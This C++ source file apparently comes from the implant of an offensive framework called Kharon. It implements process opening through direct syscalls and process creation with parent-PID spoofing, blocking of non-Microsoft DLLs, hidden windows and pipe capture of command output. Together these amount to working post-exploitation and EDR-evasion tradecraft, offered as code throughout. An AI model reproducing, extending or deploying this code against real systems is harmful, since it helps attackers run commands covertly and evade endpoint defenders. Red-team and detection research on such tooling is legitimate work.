#include <Kharon.h>

auto DECLFN Process::Open(
    _In_ ULONG RightsAccess,
    _In_ BOOL  InheritHandle,
    _In_ ULONG ProcessID
) -> HANDLE {
    HANDLE Handle = nullptr;

    if ( Self->Sys->Enabled ) {
        NTSTATUS          Status   = STATUS_UNSUCCESSFUL;
        OBJECT_ATTRIBUTES ObjAttr  = { sizeof(OBJECT_ATTRIBUTES), NULL, nullptr, 0, NULL, NULL };
        CLIENT_ID         ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };

        SyscallExec( syOpenProc, Status, &Handle, RightsAccess, &ClientID );
        Self->Usf->NtStatusToError( Status );
    } else {
        Handle = Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
    }

    return Handle;
}

auto DECLFN Process::Create(
    _In_  PCHAR                CommandLine,
    _In_  ULONG                PsFlags,
    _Out_ PPROCESS_INFORMATION PsInfo
) -> BOOL {
    ProcThreadAttrList ProcAttr;

    BOOL   Success      = FALSE;
    ULONG  TmpValue     = 0;
    HANDLE PipeWrite    = NULL;
    HANDLE PipeRead     = NULL;
    BYTE*  PipeBuff     = NULL;
    ULONG  PipeBuffSize = 0;
    UINT8  UpdateCount  = 0;

    STARTUPINFOEXA      SiEx         = { 0 };
    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    if ( Self->Ps->Ctx.BlockDlls ) { UpdateCount++; }
    if ( Self->Ps->Ctx.ParentID  ) { UpdateCount++; };

    SiEx.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
    SiEx.StartupInfo.dwFlags     = EXTENDED_STARTUPINFO_PRESENT;
    SiEx.StartupInfo.wShowWindow = SW_HIDE;

    PsFlags |= CREATE_NO_WINDOW;

    if ( Self->Ps->Ctx.Pipe ) {
        Success = Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH );
        if ( !Success ) { goto _KH_END; }

        Self->Krnl32.SetHandleInformation( PipeWrite, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT );

        SiEx.StartupInfo.hStdError  = PipeWrite;
        SiEx.StartupInfo.hStdOutput = PipeWrite;
        SiEx.StartupInfo.hStdInput  = Self->Krnl32.GetStdHandle( STD_INPUT_HANDLE );
        SiEx.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
    }

    if ( UpdateCount             ) ProcAttr.Initialize( UpdateCount );
    if ( Self->Ps->Ctx.ParentID  ) ProcAttr.UpdateParentSpf( Process::Open( PROCESS_ALL_ACCESS, TRUE, Self->Ps->Ctx.ParentID ) );
    if ( Self->Ps->Ctx.BlockDlls ) ProcAttr.UpdateBlockDlls();

    if ( Self->Ps->Ctx.ParentID || Self->Ps->Ctx.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();

    Success = Self->Krnl32.CreateProcessA(
        NULL, CommandLine, NULL, NULL, TRUE, PsFlags,
        NULL, Self->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
    );
    if ( !Success ) { goto _KH_END; }

    if ( Self->Ps->Ctx.Pipe ) {

        Self->Ntdll.NtClose( PipeWrite ); PipeWrite = NULL;

        DWORD waitResult = Self->Krnl32.WaitForSingleObject( PsInfo->hProcess, 1000 );

        if (waitResult == WAIT_TIMEOUT) {
            KhDbg( "Timeout waiting for process output" );
        }

        Success = Self->Krnl32.PeekNamedPipe(
            PipeRead, NULL, 0, NULL, &PipeBuffSize, NULL
        );

        if ( !Success ) { goto _KH_END; }

        if ( PipeBuffSize > 0 ) {
            PipeBuff = (BYTE*)Self->Hp->Alloc( PipeBuffSize );
            if ( !PipeBuff ) { goto _KH_END; }

            Success = Self->Krnl32.ReadFile(
                PipeRead, PipeBuff, PipeBuffSize, &TmpValue, NULL
            );
            if ( !Success ) { goto _KH_END; }

            KhDbg( "pipe buffer: %d", PipeBuffSize );
            KhDbg( "pipe read  : %d", TmpValue );

            Self->Ps->Out.p = PipeBuff;
            Self->Ps->Out.s = TmpValue;
        } else {
            KhDbg( "No data available in pipe" );
        }
    }

_KH_END:
    if ( PipeWrite ) Self->Ntdll.NtClose( PipeWrite );
    if ( PipeRead  ) Self->Ntdll.NtClose( PipeRead );
    if ( PsInfo->hProcess ) Self->Ntdll.NtClose( PsInfo->hProcess );
    if ( PsInfo->hThread  ) Self->Ntdll.NtClose( PsInfo->hThread  );

    return Success;
}